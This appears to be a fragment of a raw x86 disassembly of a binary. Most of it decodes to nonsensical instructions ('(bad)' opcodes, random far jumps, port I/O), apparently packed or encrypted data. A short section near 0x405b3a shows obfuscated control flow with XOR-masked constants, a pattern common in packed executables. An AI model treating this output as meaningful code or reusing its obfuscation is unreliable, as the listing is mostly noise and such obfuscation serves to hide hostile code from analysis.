  405987:	pop    ds
  405988:	pop    edi
  405989:	sub    bl,0x7b
  40598c:	shl    eax,cl
  40598e:	xchg   BYTE PTR [ecx+esi*4-0x7f],dh
  405992:	mov    ch,0xe6
  405994:	pop    edx
  405995:	loopne 0x4059cf
  405997:	push   0xffffff93
  405999:	and    al,0x71
  40599b:	dec    ecx
  40599c:	dec    ebx
  40599d:	jle    0x4059c7
  40599f:	enter  0x5544,0x77
  4059a3:	push   es
  4059a4:	cmp    al,0x2a
  4059a6:	pop    edx
  4059a7:	jns    0x4059b2
  4059a9:	rcl    BYTE PTR [esi],cl
  4059ab:	jo     0x4059dd
  4059ad:	pop    edx
  4059ae:	pop    es
  4059af:	inc    edi
  4059b0:	push   edx
  4059b1:	inc    edi
  4059b2:	fiadd  WORD PTR [edi-0x21]
  4059b5:	ss mov edx,0x308cc854
  4059bb:	jp     0x287f56f4
  4059c1:	imul   edi,esp,0x93a2564f
  4059c7:	fwait
  4059c8:	sbb    al,0x75
  4059ca:	(bad)
  4059ce:	add    ebp,DWORD PTR [edi]
  4059d0:	aaa    
  4059d1:	jnp    0x405a0f
  4059d3:	xchg   esi,eax
  4059d4:	(bad)  
  4059d7:	sbb    BYTE PTR [edx+0x54b89c70],ah
  4059dd:	jno    0x405a22
  4059df:	bound  ebp,QWORD PTR es:[edi+0x44]
  4059e3:	push   esp
  4059e4:	es repz xchg edi,eax
  4059e7:	dec    ebp
  4059e8:	inc    esp
  4059e9:	sahf   
  4059ea:	fistp  QWORD PTR [eax+edx*8-0x56]
  4059ee:	dec    esi
  4059ef:	out    dx,al
  4059f0:	shl    DWORD PTR [edi-0x68],1
  4059f3:	pop    es
  4059f4:	sbb    DWORD PTR [ebx-0x5c],esp
  4059f7:	pop    ebx
  4059f8:	jno    0x4059fc
  4059fa:	sub    eax,0x1c337e17
  4059ff:	rol    DWORD PTR [ecx-0xe61873b],cl
  405a05:	shl    DWORD PTR [esi-0x5edcfe22],0xb8
  405a0c:	(bad)
  405a0f:	inc    esp
  405a10:	mov    edx,0xf54a94f
  405a15:	aad    0xa
  405a17:	sub    ebx,esi
  405a19:	fwait
  405a1a:	sub    BYTE PTR [eax-0x55],ah
  405a1d:	adc    ebp,0xf3f9b2f7
  405a23:	jae    0x405a4d
  405a25:	addr16 in al,dx
  405a27:	xchg   edx,eax
  405a28:	int3   
  405a29:	call   0x3e5f:0xc65d21e1
  405a30:	imul   edi,DWORD PTR [ecx+ebx*2+0x57],0x1d2c6623
  405a38:	ins    DWORD PTR es:[edi],dx
  405a39:	jmp    0x405a71
  405a3b:	test   al,0x6b
  405a3d:	lahf   
  405a3e:	xchg   ebp,eax
  405a3f:	pop    edx
  405a40:	push   ecx
  405a41:	and    DWORD PTR [ecx],0x60c165e1
  405a47:	push   ebx
  405a48:	pop    edx
  405a49:	leave  
  405a4a:	xchg   esp,eax
  405a4b:	xchg   ecx,eax
  405a4c:	in     eax,dx
  405a4d:	ins    BYTE PTR es:[edi],dx
  405a4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a4f:	pushf  
  405a50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a51:	jge    0x405a30
  405a53:	jne    0x405a54
  405a55:	mov    eax,0x65e11b99
  405a5a:	sti    
  405a5b:	dec    edx
  405a5c:	push   ebx
  405a5d:	inc    edx
  405a5e:	cwde   
  405a5f:	fcom   DWORD PTR [eax+0x4a]
  405a62:	jmp    0x2a56b2fc
  405a67:	push   ebp
  405a68:	add    ch,BYTE PTR [edx-0x6b]
  405a6b:	jns    0x405aae
  405a6d:	lahf   
  405a6e:	out    dx,eax
  405a6f:	and    eax,0x691ae1c9
  405a74:	jecxz  0x405a41
  405a76:	jo     0x405ab6
  405a78:	pop    esp
  405a79:	test   al,0x4c
  405a7b:	mov    ch,BYTE PTR [edx]
  405a7d:	push   ecx
  405a7e:	cmc    
  405a7f:	call   0x6699:0xe0c786e9
  405a86:	add    esi,ebp
  405a88:	or     cl,al
  405a8a:	int    0x52
  405a8c:	lds    esp,FWORD PTR [ebx+0x3]
  405a8f:	ins    DWORD PTR es:[edi],dx
  405a90:	test   al,0x92
  405a92:	sahf   
  405a93:	adc    ebp,DWORD PTR [esi-0x305dbe8d]
  405a99:	xor    DWORD PTR [esi-0x62],edx
  405a9c:	pop    esp
  405a9d:	and    ecx,DWORD PTR gs:[eax+0x5f264dd9]
  405aa4:	loopne 0x405ae8
  405aa6:	pop    edi
  405aa7:	sbb    esi,DWORD PTR [edi+0x2865ca66]
  405aad:	inc    ebp
  405aae:	and    al,0xff
  405ab0:	leave  
  405ab1:	inc    eax
  405ab2:	cmp    edx,DWORD PTR [esi-0x77]
  405ab5:	jmp    0x2747:0x8794e160
  405abc:	dec    edi
  405abd:	xor    eax,0xdec817a7
  405ac2:	pop    ecx
  405ac3:	pop    ecx
  405ac4:	adc    ch,BYTE PTR [ebx+edi*8]
  405ac7:	int    0xc3
  405ac9:	gs sub eax,0x83e00e16
  405acf:	sahf   
  405ad0:	scas   al,BYTE PTR es:[edi]
  405ad1:	add    bl,0xf9
  405ad4:	fnstsw WORD PTR [ebx-0x2b]
  405ad7:	cmp    BYTE PTR [ebx-0x25],bl
  405ada:	ds daa 
  405adc:	push   esp
  405add:	ret    
  405ade:	mov    dl,0x87
  405ae0:	sub    eax,0x74455793
  405ae5:	fwait
  405ae6:	aad    0xf8
  405ae8:	mul    DWORD PTR [eax-0x8]
  405aeb:	lock icebp 
  405aed:	xchg   edi,eax
  405aee:	sub    esp,DWORD PTR [ebp+esi*8+0x766613dc]
  405af5:	sbb    dh,bh
  405af7:	outs   dx,BYTE PTR ds:[esi]
  405af8:	ins    BYTE PTR es:[edi],dx
  405af9:	jp     0x405b54
  405afb:	mov    ds:0xc819ca54,eax
  405b00:	adc    ah,bl
  405b02:	inc    esi
  405b03:	dec    esi
  405b04:	call   0xe307:0xf4dcad4d
  405b0b:	jmp    0x9f2c:0x7b4da7a9
  405b12:	and    eax,0xa87c466a
  405b17:	jb     0x405ad0
  405b19:	adc    esp,DWORD PTR [edx]
  405b1b:	sbb    al,al
  405b1d:	and    ch,BYTE PTR [ecx-0xa]
  405b20:	mov    eax,esi
  405b22:	pop    edi
  405b23:	neg    dl
  405b25:	ror    DWORD PTR [edi+0x1e],1
  405b28:	pop    esp
  405b29:	xchg   DWORD PTR [edi],ebp
  405b2b:	jbe    0x405b27
  405b2d:	add    DWORD PTR [edi-0x769ef168],esp
  405b33:	dec    ebp
  405b34:	adc    BYTE PTR [ecx+0xc6d],bh
  405b3a:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  405b41:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  405b48:	mov    ecx,0xf89c8532
  405b4d:	push   esi
  405b4e:	mov    esi,DWORD PTR ds:0x43381b
  405b54:	mov    DWORD PTR [ebp+0x10],0x70019f3
  405b5b:	mov    esi,DWORD PTR [ebp-0x4]
  405b5e:	cmp    ecx,esi
  405b60:	je     0x405b9b
  405b66:	mov    esi,DWORD PTR [ebp+0xc]
  405b69:	xor    ecx,eax
  405b6b:	xor    DWORD PTR ds:0x4337d3,0x55d1
  405b75:	xor    esi,eax
  405b77:	lea    ecx,[esi+ecx*1+0x32729b]
  405b7e:	xor    ecx,eax
  405b80:	cmp    ecx,0xf89c8521
  405b86:	jne    0x405b4e
  405b8c:	mov    DWORD PTR ds:0x433823,0x74e6
  405b96:	jmp    0x4062dd
  405b9b:	add    ecx,0xffcd8d65
  405ba1:	mov    esi,ecx
  405ba3:	xor    esi,eax
  405ba5:	add    esi,DWORD PTR [ebp+0x8]
  405ba8:	mov    DWORD PTR ds:0x43386f,0x6ead
  405bb2:	mov    DWORD PTR [ebp+0x8],esi
  405bb5:	mov    esi,DWORD PTR [ebp+0x8]
  405bb8:	mov    DWORD PTR ds:0x4338af,0x3a4c
  405bc2:	jmp    0x405f11
  405bc7:	jmp    0x4f7a1a24
  405bcc:	fldcw  WORD PTR [ecx+0x68]
  405bcf:	les    esi,FWORD PTR [esi-0x41]
  405bd2:	adc    eax,0xcc1a7644
  405bd7:	call   0x2cbeda11
  405bdc:	jge    0x405c5c
  405bde:	jle    0x405b86
  405be0:	adc    esi,ebp
  405be2:	mov    ah,0x1f
  405be4:	js     0x405c52
  405be6:	int    0x63
  405be8:	retf   0xc571
  405beb:	and    al,0xe7
  405bed:	pop    ss
  405bee:	mov    esi,0x4d9719fb
  405bf3:	xchg   esi,eax
  405bf4:	mov    esp,0x38bb178
  405bf9:	push   es
  405bfa:	mov    BYTE PTR ds:0xf2661ede,al
  405c00:	shr    DWORD PTR [ebx],cl
  405c02:	out    0xa4,eax
  405c04:	cmp    ch,dl
  405c06:	jg     0x405c77
  405c08:	sub    al,BYTE PTR ds:0x8ff509d1
  405c0e:	push   ebp
  405c0f:	fcomi  st,st(6)
  405c11:	mov    ds:0x3aebefc4,al
  405c16:	xchg   BYTE PTR [esi-0x16],dl
  405c19:	xchg   esp,eax
  405c1a:	sbb    eax,0x78a2c2b6
  405c1f:	pop    ss
  405c20:	pop    esi
  405c21:	or     ch,ch
  405c23:	add    al,0x3
  405c25:	fcomp  QWORD PTR [esi+0x14]
  405c28:	dec    ebp
  405c29:	icebp  
  405c2a:	or     BYTE PTR [edx+0x1f],ch
  405c2d:	or     al,0xcd
  405c2f:	inc    ebx
  405c30:	rol    DWORD PTR [edx-0x4],0xb1
  405c34:	imul   esi,esi,0x63
  405c37:	push   ebp
  405c38:	add    bh,0xef
  405c3b:	mov    eax,0x399add5e
  405c40:	outs   dx,DWORD PTR ds:[esi]
  405c41:	fld    DWORD PTR [ecx-0x46]
  405c44:	cdq    
  405c45:	aaa    
  405c46:	dec    ebp
  405c47:	mov    ah,0xf2
  405c49:	or     cl,cl
  405c4b:	(bad)  [ecx+ebx*1-0x2c]
  405c4f:	leave  
  405c50:	add    DWORD PTR [edi-0x2142bdd5],ebp
  405c56:	inc    ebx
  405c57:	pop    eax
  405c58:	dec    ecx
  405c59:	jp     0x405bf3
  405c5b:	inc    edx
  405c5c:	add    eax,0x40c65811
  405c61:	mov    cl,0x7
  405c63:	retf   
  405c64:	iret   
  405c65:	or     ecx,DWORD PTR [eax+0x1b]
  405c68:	cmp    edx,0x236537d3
  405c6e:	ficom  DWORD PTR [edx+0xb423865]
  405c74:	mov    edi,0xac15095e
  405c79:	xor    al,0xc7
  405c7b:	xor    DWORD PTR [ebp+0x6f99e5c0],0x5c727099
  405c85:	mov    dl,0x96
  405c87:	(bad)  
  405c88:	xor    BYTE PTR [edi],dh
  405c8a:	xchg   edi,eax
  405c8b:	cmp    eax,0xc226df1b
  405c90:	ins    DWORD PTR es:[edi],dx
  405c91:	jp     0x405c7b
  405c93:	mov    ebp,0x2aa3fd
  405c98:	add    dh,BYTE PTR [esi-0x22]
  405c9b:	push   edi
  405c9c:	pop    edi
  405c9d:	add    edi,edi
  405c9f:	xchg   DWORD PTR [eax],edx
  405ca1:	mov    dl,dl
  405ca3:	sub    al,0x2e
  405ca5:	mov    cr6,edi
  405ca8:	jnp    0x405cb8
  405caa:	scas   al,BYTE PTR es:[edi]
  405cab:	jnp    0x405cca
  405cad:	adc    BYTE PTR [esi-0x1873d696],ah
  405cb3:	leave  
  405cb4:	sahf   
  405cb5:	inc    ebx
  405cb6:	cmp    DWORD PTR [ebx],0x78190af5
  405cbc:	sahf   
  405cbd:	out    0x9e,eax
  405cbf:	mov    esi,0x4c510f5f
  405cc4:	and    BYTE PTR [edx-0x77aac5d5],ah
  405cca:	xchg   edx,eax
  405ccb:	ss jmp 0x405cd7
  405cce:	push   edx
  405ccf:	xchg   edx,eax
  405cd0:	loope  0x405c7f
  405cd2:	cli    
  405cd3:	push   ecx
  405cd4:	daa    
  405cd5:	inc    BYTE PTR [ebx-0x67068882]
  405cdb:	pop    ebx
  405cdc:	mov    esp,DWORD PTR [ebp+0x70c7b756]
  405ce2:	cs retf 
  405ce4:	push   ebp
  405ce5:	jne    0x405d20
  405ce7:	mov    ds:0x3d05ceef,al
  405cec:	sub    DWORD PTR [ebx-0x71b8048c],eax
  405cf2:	push   ebp
  405cf3:	sahf   
  405cf4:	dec    ecx
  405cf5:	push   ss
  405cf6:	hlt    
  405cf7:	jp     0x405cff
  405cf9:	cmp    al,0x4e
  405cfb:	adc    al,0xb3
  405cfd:	xor    al,0xbc
  405cff:	call   0x97d1b363
  405d04:	and    BYTE PTR [edi+0xb0a27cc],cl
  405d0a:	(bad)  
  405d0b:	mov    ah,0xf8
  405d0d:	push   cs
  405d0e:	out    0xf0,al
  405d10:	dec    ecx
  405d11:	sar    bl,1
  405d13:	jns    0x405ce4
  405d15:	ins    BYTE PTR es:[edi],dx
  405d16:	pushf  
  405d17:	daa    
  405d18:	stc    
  405d19:	stos   BYTE PTR es:[edi],al
  405d1a:	sub    al,dh
  405d1c:	push   ecx
  405d1d:	cmp    DWORD PTR [ecx],edx
  405d1f:	mov    esi,0x82596ba3
  405d24:	adc    eax,0x49763984
  405d29:	mov    ebp,0xfa921c37
  405d2e:	stc    
  405d2f:	inc    esi
  405d30:	test   al,0xa5
  405d32:	or     BYTE PTR [edi],bl
  405d34:	(bad)  
  405d35:	cld    
  405d36:	ins    DWORD PTR es:[edi],dx
  405d37:	adc    DWORD PTR [eax],edi
  405d39:	and    eax,0x2921c8b1
  405d3e:	stos   BYTE PTR es:[edi],al
  405d3f:	lahf   
  405d40:	mov    eax,ds:0x269f1a4e
  405d45:	mov    DWORD PTR [ecx+edx*8],ebp
  405d48:	(bad)  
  405d49:	(bad)  
  405d4a:	in     al,0xe7
  405d4c:	test   eax,0x7696bbf9
  405d51:	jae    0x405d1b
  405d53:	mov    ebp,0x302cc7
  405d58:	push   ecx
  405d59:	mov    dh,0x29
  405d5b:	or     DWORD PTR [ebx],ecx
  405d5d:	push   ebp
  405d5e:	pop    ebp
  405d5f:	inc    ebx
  405d60:	dec    eax
  405d61:	je     0x405d38
  405d63:	inc    ebp
  405d64:	idiv   DWORD PTR [esi-0x500a0ca2]
  405d6a:	jns    0x405dc3
  405d6c:	retf   
  405d6d:	mov    ebp,0x8c4ccf7b
  405d72:	pusha  
  405d73:	inc    eax
  405d74:	and    ebp,DWORD PTR [eax-0x78]
  405d77:	sti    
  405d78:	inc    ecx
  405d79:	push   ecx
  405d7a:	std    
  405d7b:	cwde   
  405d7c:	mov    dl,0x2c
  405d7e:	inc    ebx
  405d7f:	mov    ds:0x6002d5c7,al
  405d84:	stos   BYTE PTR es:[edi],al
  405d85:	xor    ebx,DWORD PTR [esi+0x2622d0c2]
  405d8b:	pop    ecx
  405d8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d8d:	ss iret 
  405d8f:	dec    edx
  405d90:	xchg   BYTE PTR [edx+ecx*8+0x3338b670],al
  405d97:	push   esp
  405d98:	mov    dl,0xdc
  405d9a:	and    DWORD PTR [eax+0x73c7c817],edx
  405da0:	fwait
  405da1:	jp     0x405de0
  405da3:	(bad)  
  405da4:	sahf   
  405da5:	mov    esi,0xb2bf2992
  405daa:	sub    BYTE PTR [edx+0x715a42c0],cl
  405db0:	(bad)  
  405db1:	int    0x74
  405db3:	test   DWORD PTR [eax],esi
  405db5:	pop    edx
  405db6:	mov    WORD PTR [esi+0x3c404a18],es
  405dbc:	test   eax,0x2a2d2c6c
  405dc1:	mov    ds:0xa33b28b8,eax
  405dc6:	sub    DWORD PTR [esi-0x4306ab8f],ebx
  405dcc:	call   0xc172:0x5d9333a8
  405dd3:	lahf   
  405dd4:	push   es
  405dd5:	and    BYTE PTR [ecx-0x1d049575],bl
  405ddb:	add    BYTE PTR [edi],dh
  405ddd:	mov    bl,0x36
  405ddf:	out    0xe2,eax
  405de1:	mov    ch,0x53
  405de3:	push   ds
  405de4:	xor    al,dh
  405de6:	pop    edx
  405de7:	jo     0x405e02
  405de9:	clc    
  405dea:	imul   esp,DWORD PTR [eax+0x5],0x50d5da15
  405df1:	lea    esi,[edx]
  405df3:	push   esi
  405df4:	mov    edx,0x2f6fd899
  405df9:	fwait
  405dfa:	jmp    0x405e76
  405dfc:	or     eax,0xd643682a
  405e01:	mov    dh,0x81
  405e03:	push   eax
  405e05:	popa   
  405e06:	pop    ebp
  405e07:	cli    
  405e08:	mov    ecx,0x75622b1a
  405e0d:	repz aaa 
  405e0f:	ins    BYTE PTR es:[edi],dx
  405e10:	test   eax,0xdd6a2c52
  405e15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e16:	mov    ds:0x998858,al
  405e1b:	sbb    esp,esi
  405e1d:	(bad)  
  405e1e:	shr    BYTE PTR [ebx+0x616b6a81],cl
  405e24:	cmp    ah,BYTE PTR [eax-0x35]
  405e27:	call   0x78d1:0xe6dca063
  405e2e:	inc    esp
  405e2f:	fidivr DWORD PTR [esi+0x541a0d95]
  405e35:	jbe    0x405e48
  405e37:	inc    eax
  405e38:	retf   
  405e39:	call   ecx
  405e3b:	inc    esp
  405e3c:	cs xchg ebp,eax
  405e3e:	mov    esi,0x35f994e1
  405e43:	test   al,0xa3
  405e45:	outs   dx,BYTE PTR ds:[esi]
  405e46:	ss inc esp
  405e48:	loopne 0x405df1
  405e4a:	add    BYTE PTR [esp+ebx*8-0x6148a561],al
  405e51:	sahf   
  405e52:	ret    0x26
  405e55:	sbb    ch,BYTE PTR [esi+edx*1]
  405e58:	xchg   DWORD PTR [bp+si+0x3e],ecx
  405e5c:	pushf  
  405e5d:	xchg   esi,eax
  405e5e:	push   0x2e
  405e60:	(bad)  
  405e61:	pop    ebx
  405e62:	imul   ebx,DWORD PTR [ecx-0x78],0x3e303579
  405e69:	iret   
  405e6a:	and    bh,BYTE PTR [ebp+0x40]
  405e6d:	icebp  
  405e6e:	mov    ds:0x8a20e34a,eax
  405e73:	stc    
  405e74:	out    dx,al
  405e75:	push   es
  405e76:	and    bh,BYTE PTR [ebx+0x1ad65070]
  405e7c:	inc    ebx
  405e7d:	jge    0x405ef1
  405e7f:	jmp    0x7f8e:0xfb7073d5
  405e86:	add    esi,DWORD PTR [ecx+edi*1-0xace97f9]
  405e8d:	out    dx,al
  405e8e:	or     BYTE PTR [ebx+edi*2-0x49],0x59
  405e93:	test   BYTE PTR [eax-0x11800907],bl
  405e99:	sbb    eax,0x4a58cca6
  405e9e:	dec    edx
  405e9f:	jmp    0xac1e:0xb2ce71b7
  405ea6:	or     edx,ebp
  405ea8:	pop    eax
  405ea9:	sub    BYTE PTR [ebx],bl
  405eab:	cmp    esp,DWORD PTR [ecx+ebx*1+0xc37a121]
  405eb2:	jge    0x405efa
  405eb4:	adc    DWORD PTR [ebx-0x2e],ecx
  405eb7:	in     eax,dx
  405eb8:	test   al,0x70
  405eba:	aas    
  405ebb:	inc    ebp
  405ebc:	call   0x96b5b07f
  405ec1:	xor    eax,0x787c25e6
  405ec6:	scas   eax,DWORD PTR es:[edi]
  405ec7:	loopne 0x405f36
  405ec9:	inc    eax
  405eca:	xchg   edx,eax
  405ecb:	jbe    0x405ee9
  405ecd:	bound  edi,QWORD PTR [eax+edi*8]
  405ed0:	push   ebp
  405ed1:	cmp    BYTE PTR [eax+0x43],dl
  405ed4:	cmp    BYTE PTR [eax+eiz*2],ah
  405ed7:	sahf   
  405ed8:	leave  
  405ed9:	ret    
  405eda:	icebp  
  405edb:	lods   al,BYTE PTR ds:[esi]
  405edc:	cmc    
  405edd:	leave  
  405ede:	rcl    bh,1
  405ee0:	fimul  WORD PTR [ebx]
  405ee2:	xchg   edx,ecx
  405ee4:	add    edi,esp
  405ee6:	inc    ebx
  405ee7:	pop    esi
  405ee8:	popf   
  405ee9:	jnp    0x405e6b
  405eeb:	call   esi
  405eed:	mov    bh,0xd2
  405eef:	and    DWORD PTR [ebp-0x39c813a2],esi
  405ef5:	jo     0x405f75
  405ef7:	push   eax
  405ef8:	mov    edi,0x67789ae8
  405efd:	dec    esp
  405efe:	popf   
  405eff:	ss dec edx
  405f01:	xor    eax,DWORD PTR [ebx+0x34]
  405f04:	out    dx,eax
  405f05:	aam    0x35
  405f07:	aam    0xc0
  405f09:	leave  
  405f0a:	stos   DWORD PTR es:[edi],eax
  405f0b:	in     eax,0x9e
  405f0d:	popf   
  405f0e:	popa   
  405f0f:	mov    al,ds:0xf7f13306
  405f14:	fldl2t 
  405f16:	dec    edx
  405f17:	add    eax,DWORD PTR [eax]
  405f19:	add    BYTE PTR [ebp-0x2e],dh
  405f1c:	sub    al,0xaa
  405f1e:	test   eax,0x31d17170
  405f23:	test   eax,edx
  405f25:	mov    WORD PTR [edx-0x599cc195],?
  405f2b:	xor    BYTE PTR [esi+0x7e],bh
  405f2e:	sub    al,0x7d
  405f30:	jle    0x405fb0
  405f32:	out    0x3d,eax
  405f34:	sahf   
  405f35:	popf   
  405f36:	stc    
  405f37:	add    dh,dl
  405f39:	jne    0x405efe
  405f3b:	rol    bh,cl
  405f3d:	mov    bl,0xc4
  405f3f:	or     BYTE PTR [eax-0x5e493a5],bh
  405f45:	aad    0x72
  405f47:	fnstcw WORD PTR [eax-0x6f]
  405f4a:	adc    eax,0x58133fae
  405f4f:	push   edi
  405f50:	test   al,0x1c
  405f52:	add    dh,BYTE PTR [eax+0x6a]
  405f55:	push   cs
  405f56:	and    BYTE PTR [ebp+ebp*8-0x43],cl
  405f5a:	xor    esp,ebp
  405f5c:	jg     0x405f4e
  405f5e:	sub    DWORD PTR [ecx],ecx
  405f60:	fcmove st,st(0)
  405f62:	and    al,0x6a
  405f64:	dec    ecx
  405f65:	jno    0x405fdd
  405f67:	scas   eax,DWORD PTR es:[edi]
  405f68:	in     al,dx
  405f69:	xchg   edi,eax
  405f6a:	in     eax,0xa0
  405f6c:	fcomp  QWORD PTR [eax-0x67]
  405f6f:	jp     0x405f5a
  405f71:	iret   
  405f72:	sub    eax,0xb705181c
  405f77:	mov    eax,0xd005b0da
  405f7c:	mov    cs,WORD PTR [edi-0xc]
  405f7f:	retf   
  405f80:	repnz out 0x71,al
  405f83:	sub    al,0xa6
  405f85:	mov    edi,0x7ab02860
  405f8a:	push   esp
  405f8b:	fild   QWORD PTR [ecx-0x30a20851]
  405f91:	push   ebp
  405f92:	(bad)  
  405f93:	mov    esi,ds
  405f95:	mov    cl,0x41
  405f97:	xchg   ecx,eax
  405f98:	lahf   
  405f99:	dec    esp
  405f9a:	jmp    0x405f4d
  405f9c:	loope  0x405fca
  405f9e:	cmp    al,0xd2
  405fa0:	sahf   
  405fa1:	push   ds
  405fa2:	retf   
  405fa3:	mov    esp,0xe3539212
  405fa8:	pop    esi
  405fa9:	mov    BYTE PTR [ebp+0xf73c9d],dl
  405faf:	push   edi
  405fb0:	push   edi
  405fb1:	push   edx
  405fb2:	(bad)  ss:[ebx]
  405fb5:	pop    esi
  405fb6:	inc    esi
  405fb7:	adc    al,0x47
  405fb9:	pop    ebp
  405fba:	arpl   WORD PTR [esp+ecx*4-0x73],sp
  405fbe:	xchg   WORD PTR [ecx-0x47a864ed],bp
  405fc5:	mov    bh,0x69
  405fc7:	repz xlat BYTE PTR ds:[ebx]
  405fc9:	gs aad 0x82
  405fcc:	retf   0xc75e
  405fcf:	jle    0x40601f
  405fd1:	sbb    eax,0x870280
  405fd6:	lods   al,BYTE PTR ds:[esi]
  405fd7:	inc    esp
  405fd8:	aam    0xc4
  405fda:	push   ds
  405fdb:	dec    ebp
  405fdc:	clc    
  405fdd:	sbb    eax,0xb1a7022
  405fe2:	jae    0x40604b
  405fe4:	jb     0x406064
  405fe6:	fld    st(1)
  405fe8:	xchg   ebp,eax
  405fe9:	aam    0xa9
  405feb:	cmp    al,0x32
  405fed:	jo     0x406004
  405fef:	xor    bh,BYTE PTR [ebx+0x4d]
  405ff2:	lods   eax,DWORD PTR ds:[esi]
  405ff3:	les    edi,FWORD PTR [eax-0x5e]
  405ff6:	popf   
  405ff7:	mov    DWORD PTR [ecx+0xbbc3fe4],eax
  405ffd:	inc    ebx
  405ffe:	dec    BYTE PTR [ebx]
  406000:	cmp    ebp,edx
  406002:	imul   esi,DWORD PTR [ebx],0xa5efb0c1
  406008:	inc    esp
  406009:	xchg   ebx,eax
  40600a:	outs   dx,DWORD PTR ds:[esi]
  40600b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40600c:	mov    ecx,0x8bc1dccf
  406011:	push   0x49f1c7e2
  406016:	mov    ds:0x3ae97d8d,al
  40601b:	cmp    al,0xae
  40601d:	hlt    
  40601e:	adc    al,al
  406020:	xor    al,0xc0
  406022:	lahf   
  406023:	(bad)  
  406025:	mov    cl,0x26
  406027:	mov    ds:0x62ab7761,al
  40602c:	add    BYTE PTR [ebp+0x35076220],ah
  406032:	fisub  DWORD PTR [ecx-0x3a601533]
  406038:	in     eax,dx
  406039:	sub    al,0xe0
  40603b:	or     BYTE PTR [ebp*8+0x79f5d743],ch
  406042:	fs adc eax,0x795eeceb
  406048:	rol    BYTE PTR [ebx+0x1d51b5f6],0x6f
  40604f:	clc    
  406050:	mov    edx,0x7597b9be
  406055:	jne    0x40609d
  406057:	int3   
  406058:	jne    0x406027
  40605a:	ins    BYTE PTR es:[edi],dx
  40605b:	inc    eax
  40605c:	inc    ecx
  40605d:	inc    ebp
  40605e:	lods   al,BYTE PTR ds:[esi]
  40605f:	or     eax,0xf52c0673
  406064:	ret    
  406065:	dec    ecx
  406066:	rcl    DWORD PTR [ebx+0x62],1
  406069:	test   al,0xa5
  40606b:	add    ebx,DWORD PTR [ecx-0x6dc09858]
  406071:	sbb    DWORD PTR [edx+0x755e695],0x99f45e02
  40607b:	mov    al,0xbc
  40607d:	and    DWORD PTR [edx+0x4cf33d3f],eax
  406083:	inc    ebx
  406084:	xlat   BYTE PTR ds:[ebx]
  406085:	and    DWORD PTR [edi-0x7f62b3f2],0x9f721058
  40608f:	mov    bl,0xce
  406091:	xchg   dh,bh
  406093:	sbb    edx,DWORD PTR es:[edi]
  406096:	xchg   edx,eax
  406097:	adc    al,0x7
  406099:	ja     0x406044
  40609b:	test   DWORD PTR [eax+0x4],0x32a3395d
  4060a2:	pushf  
  4060a3:	call   0xcaa3981d
  4060a8:	neg    DWORD PTR [ebp+0x438a7646]
  4060ae:	lea    ebp,[edi+esi*4]
  4060b1:	lods   al,BYTE PTR ds:[esi]
  4060b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060b3:	into   
  4060b4:	and    DWORD PTR [ebx+0x7e],edx
  4060b7:	(bad)  
  4060b8:	cmp    eax,DWORD PTR [edi]
  4060ba:	mov    al,0xa6
  4060bc:	shl    DWORD PTR [ecx-0x33],1
  4060bf:	sbb    al,ch
  4060c1:	jecxz  0x40604b
  4060c3:	lahf   
  4060c4:	mov    fs,WORD PTR [edx+0x5ef9e2ae]
  4060ca:	lds    ecx,FWORD PTR [eax+0x647b0ad3]
  4060d0:	adc    BYTE PTR fs:[edx+0x1f],bh
  4060d4:	mov    WORD PTR [ecx-0x3e],es
  4060d7:	sbb    bh,bl
  4060d9:	cld    
  4060da:	jmp    0x31de:0x32d03f7a
  4060e1:	popf   
  4060e2:	inc    edx
  4060e3:	je     0x4060ac
  4060e5:	mov    ecx,0x75239da3
  4060ea:	mov    es,WORD PTR [eax+0x0]
  4060ed:	and    eax,0xfe1688eb
  4060f2:	push   edx
  4060f3:	xchg   esi,eax
  4060f4:	cmp    esp,0xffffff93
  4060f7:	sbb    al,0x88
  4060f9:	ret    0x7c90
  4060fc:	mov    dl,BYTE PTR [edx-0x36cc8da1]
  406102:	fcomp  st(6)
  406104:	out    0x6d,eax
  406106:	sub    al,0x71
  406108:	dec    ebp
  406109:	(bad)  
  40610a:	ds push eax
  40610c:	xor    DWORD PTR [ebx+edx*1+0x20473f2f],edx
  406113:	cmp    esi,edi
  406115:	ins    DWORD PTR es:[edi],dx
  406116:	aas    
  406117:	mov    edi,0x12f4c0ad
  40611c:	push   esp
  40611d:	pop    eax
  40611e:	xlat   BYTE PTR ds:[ebx]
  40611f:	imul   DWORD PTR [ebp-0x6e42183e]
  406125:	mov    dh,BYTE PTR [ebx]
  406127:	jns    0x4060e5
  406129:	test   DWORD PTR [edx],eax
  40612b:	push   esi
  40612c:	test   BYTE PTR [edx-0x7e2c3732],ch
  406132:	jg     0x40613b
  406134:	xchg   BYTE PTR ss:0x13efc7b2,ah
  40613b:	dec    ebp
  40613c:	ret    
  40613d:	or     dh,al
  40613f:	add    BYTE PTR [ecx+0x706e97d9],bh
  406145:	jle    0x4061a3
  406147:	mov    edx,0x59e80fe5
  40614c:	popf   
  40614d:	inc    ebx
  40614e:	mov    ah,0x77
  406150:	mov    ebx,0x910e9fbd
  406155:	aas    
  406156:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406157:	dec    edx
  406158:	fdivrp st(2),st
  40615a:	fidiv  DWORD PTR [esi-0x574d4a5b]
  406160:	int    0xce
  406162:	mov    eax,0xca689a8b
  406167:	out    dx,eax
  406168:	dec    ebp
  406169:	stos   DWORD PTR es:[edi],eax
  40616a:	dec    eax
  40616b:	mov    esp,DWORD PTR [ecx-0x22822e7]
  406171:	xor    dh,ah
  406173:	mov    bh,0xe1
  406175:	xchg   BYTE PTR [ecx+0xfecbbec],bl
  40617b:	pop    es
  40617c:	push   eax
  40617d:	inc    edi
  40617e:	mov    edx,0xb31371ee
  406183:	out    dx,eax
  406184:	mov    dh,0xf
  406186:	xor    al,0x46
  406188:	shl    BYTE PTR [esi+0x4e],cl
  40618b:	arpl   WORD PTR ds:0x4cddb184,bx
  406191:	or     dh,BYTE PTR [esi-0x6e]
  406194:	jno    0x406146
  406196:	and    al,0x84
  406198:	in     eax,0x9
  40619a:	addr16 inc ecx
  40619c:	aaa    
  40619d:	popa   
